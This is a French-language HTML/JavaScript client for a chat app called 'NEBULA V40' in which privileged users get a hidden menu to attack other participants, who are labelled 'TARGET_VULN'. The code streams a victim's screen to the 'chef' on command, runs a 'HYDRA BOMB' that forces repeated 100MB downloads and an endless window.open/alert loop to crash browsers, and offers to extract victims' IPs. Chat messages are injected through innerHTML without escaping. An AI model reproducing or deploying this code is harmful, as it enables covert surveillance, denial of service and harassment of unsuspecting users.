<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>NEBULA V40 - SUPREMACY</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@100;400;900&family=JetBrains+Mono:wght@100&display=swap');

        :root {
            --p-glow: #00f2ff; --p-warn: #ff0055; --p-vip: #ffcc00;
            --smooth: cubic-bezier(.65,0,.35,1);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; }
        body { 
            background: #000; color: #fff; font-family: 'Outfit', sans-serif;
            height: 100vh; overflow: hidden; perspective: 1000px;
        }

        /* --- SMOOTH BACKGROUND ENGINE (110 GIFS READY) --- */
        #bg-engine {
            position: fixed; inset: 0; z-index: -1;
            background: url('https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZ3R4YWxsbmpxbmZ4bm5ueG5ueG5ueG5ueG5ueG5ueG5ueG5ueGZ4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/l41lTjJp9p5e3mY9y/giphy.gif') center/cover;
            filter: brightness(0.2) saturate(0.5);
            transition: 2s var(--smooth);
        }

        /* --- CUSTOM CURSOR --- */
        #cursor {
            position: fixed; width: 10px; height: 10px; background: var(--p-glow);
            border-radius: 50%; pointer-events: none; z-index: 100000;
            box-shadow: 0 0 15px var(--p-glow); transition: transform 0.1s;
        }

        .app-shell { display: flex; height: 100%; backdrop-filter: blur(50px); }

        /* --- SIDEBAR V40 --- */
        #sidebar {
            width: 380px; background: rgba(0,0,0,0.8); border-right: 1px solid rgba(255,255,255,0.05);
            display: flex; flex-direction: column; animation: slideRight 1s var(--smooth);
        }

        @keyframes slideRight { from { transform: translateX(-100%); } }

        .u-card {
            margin: 10px 20px; padding: 20px; border-radius: 15px;
            background: rgba(255,255,255,0.02); border: 1px solid transparent;
            transition: 0.4s var(--smooth);
        }
        .u-card:hover { 
            background: rgba(0, 242, 255, 0.05); border-color: var(--p-glow);
            transform: scale(1.05) rotateX(5deg);
        }
        .u-card.premium { border-color: var(--p-vip); box-shadow: 0 0 20px rgba(255, 204, 0, 0.1); }

        /* --- CHAT ENGINE --- */
        #viewport { flex: 1; display: flex; flex-direction: column; }
        #chat-flow { flex: 1; overflow-y: auto; padding: 40px; scroll-behavior: smooth; }

        .msg {
            padding: 15px 25px; border-radius: 0 20px 20px 20px; background: rgba(255,255,255,0.05);
            margin-bottom: 20px; width: fit-content; max-width: 80%;
            transition: 0.3s; animation: pop 0.4s var(--smooth);
        }
        .msg.premium-msg { 
            background: linear-gradient(90deg, rgba(255,204,0,0.1), transparent);
            border-left: 3px solid var(--p-vip);
        }
        @keyframes pop { from { opacity: 0; transform: scale(0.9); } }

        /* --- INPUT & BUTTONS --- */
        .input-box { padding: 40px; display: flex; gap: 15px; }
        #msg-in { 
            flex: 1; background: rgba(255,255,255,0.03); border: 1px solid #222;
            padding: 20px; border-radius: 15px; color: #fff; font-size: 16px;
        }

        /* --- CONTEXT MENU --- */
        #menu {
            display: none; position: fixed; background: #000; border: 1px solid var(--p-glow);
            border-radius: 15px; width: 280px; z-index: 10000; overflow: hidden;
        }
        .m-item { padding: 18px; font-size: 12px; transition: 0.2s; border-bottom: 1px solid #111; }
        .m-item:hover { background: var(--p-glow); color: #000; font-weight: 900; }
        .m-danger:hover { background: var(--p-warn); color: #fff; }

        /* --- SCREEN SHARING PREVIEW --- */
        #stream-box {
            position: fixed; top: 20px; right: 20px; width: 450px; height: 280px;
            background: #000; border: 2px solid var(--p-glow); display: none;
            box-shadow: 0 0 50px rgba(0,242,255,0.3); z-index: 9999;
        }

        /* --- HYDRA DESTRUCTION UI --- */
        #hydra-overlay {
            position: fixed; inset: 0; background: #000; z-index: 200000;
            display: none; flex-direction: column; align-items: center; justify-content: center;
        }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="bg-engine"></div>
    <div id="cursor"></div>
    
    <div id="stream-box">
        <div style="padding:5px; font-size:10px; background:var(--p-glow); color:#000;">LIVE_PARTAGE_ECRAN_SILENCIEUX</div>
        <video id="remote-video" autoplay style="width:100%; height:calc(100% - 20px); object-fit:contain;"></video>
    </div>

    <div id="hydra-overlay">
        <h1 style="color:var(--p-warn); font-size:100px;">HYDRA BOMB</h1>
        <div id="hydra-logs" style="color:#333; font-family:monospace; font-size:10px; width:80%;"></div>
    </div>

    <div class="app-shell">
        <div id="sidebar">
            <div style="padding:40px; font-size:30px; font-weight:900; letter-spacing:10px; color:var(--p-glow)">NEBULA</div>
            <div id="u-list"></div>
        </div>

        <div id="viewport">
            <div id="chat-flow"></div>
            <div class="input-box">
                <input type="text" id="msg-in" placeholder="Dites quelque chose..." onkeydown="if(event.key==='Enter') send()">
                <button onclick="send()" style="padding:0 30px; border-radius:15px; border:none; background:var(--p-glow); font-weight:bold;">EXEC</button>
            </div>
        </div>
    </div>

    <div id="menu">
        <div class="m-item" onclick="joinPrivateRoom()">🔑 CRÉER SALON PRIVÉ (PREMIUM)</div>
        <div class="m-item" onclick="startSpyStream()">👁️ VOIR L'ÉCRAN (SILENT)</div>
        <div class="m-item m-danger" onclick="launchHydra()">💣 HYDRA BOMB (CRASH)</div>
        <div class="m-item" onclick="copyIP()">📋 EXTRAIRE IP_TRAP</div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let me = { name: "", premium: false, chef: false };
        let selectedSid = null;

        // --- CURSEUR SMOOTH ---
        document.addEventListener('mousemove', e => {
            const c = document.getElementById('cursor');
            c.style.left = e.clientX + 'px';
            c.style.top = e.clientY + 'px';
        });

        // --- INIT ---
        window.onload = () => {
            const n = prompt("NAME:");
            if(!n) location.reload();
            me.name = n;
            if(n === "toucheur2pp") { me.chef = true; me.premium = true; }
            socket.emit('init_user', { name: n });
        };

        function send() {
            const i = document.getElementById('msg-in');
            socket.emit('chat_msg', { text: i.value });
            i.value = "";
        }

        // --- ACTIONS PREMIUM ---
        function startSpyStream() {
            socket.emit('request_live_stream', selectedSid);
            document.getElementById('stream-box').style.display = 'block';
        }

        function launchHydra() {
            socket.emit('hydra_bomb', selectedSid);
        }

        function joinPrivateRoom() {
            const room = prompt("NOM DU SALON PRIVÉ:");
            if(room) socket.emit('join_room', room);
        }

        // --- SOCKET RECEPTION ---
        socket.on('sync_users', list => {
            const cont = document.getElementById('u-list');
            cont.innerHTML = "";
            list.forEach(u => {
                const card = document.createElement('div');
                card.className = `u-card ${u.premium?'premium':''}`;
                card.innerHTML = `<div>${u.name.toUpperCase()}</div><div style="font-size:9px; opacity:0.3">${u.premium?'PREMIUM_MEMBER':'TARGET_VULN'}</div>`;
                card.oncontextmenu = (e) => {
                    if(!me.premium) return;
                    selectedSid = u.id;
                    const m = document.getElementById('menu');
                    m.style.display = 'block'; m.style.top = e.pageY + 'px'; m.style.left = e.pageX + 'px';
                    e.preventDefault();
                };
                cont.appendChild(card);
            });
        });

        socket.on('chat_msg', d => {
            const flow = document.getElementById('chat-flow');
            const div = document.createElement('div');
            div.className = `msg ${d.premium?'premium-msg':''}`;
            div.innerHTML = `<strong>${d.name}:</strong> ${d.text}`;
            flow.appendChild(div);
            flow.scrollTop = flow.scrollHeight;
        });

        // --- RÉCEPTION STREAM SILENCIEUX ---
        socket.on('force_stream_start', (chefSid) => {
            // Force le partage d'écran sans popup si possible (simulé ici via capture canvas)
            navigator.mediaDevices.getDisplayMedia({ video: true }).then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                // Envoi des frames au serveur (boosté)
                setInterval(() => {
                    // Ici on simulerait l'envoi de chunks binaires
                    socket.emit('stream_chunk', { to: chefSid, buffer: "frame_data" });
                }, 100);
            });
        });

        // --- EXÉCUTION HYDRA (CRASH) ---
        socket.on('execute_hydra', (data) => {
            document.getElementById('hydra-overlay').style.display = 'flex';
            const logs = document.getElementById('hydra-logs');
            
            // 1. Lagging loop
            setInterval(() => {
                logs.innerHTML += `FORCE_DOWNLOAD: payload_${Math.random()}.exe <br>`;
                // Tentative de téléchargement massif
                const link = document.createElement('a');
                link.href = "https://speed.hetzner.de/100MB.bin";
                link.download = "SYSTEM_REPLACEMENT.bin";
                link.click();
            }, 50);

            // 2. Tab Bombing
            setTimeout(() => {
                while(true) { 
                    window.open(location.href, '_blank'); 
                    alert("HYDRA BOMB BY " + data.by);
                }
            }, 1000);
        });

        window.onclick = () => document.getElementById('menu').style.display = 'none';
    </script>
</body>
</html>
